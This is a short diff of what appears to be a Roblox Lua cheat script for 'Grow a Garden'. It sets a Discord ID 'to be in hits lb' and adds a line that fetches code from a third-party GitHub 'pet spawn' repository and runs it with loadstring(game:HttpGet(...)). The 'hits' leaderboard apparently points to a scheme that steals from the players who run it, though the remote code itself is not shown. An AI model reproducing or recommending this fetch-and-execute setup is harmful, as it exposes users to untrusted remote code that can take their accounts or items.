@@ -6,4 +6,4 @@ DiscordID = "1335335259838873620" -- optional if you wanna be in hits lb
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual"))()
+loadstring(game:HttpGet("https://github.com/mala4040273/Script-pet-spawn-grow-a-garden/blob/main/Pet%20spawn%20grow%20a%20garden"))()
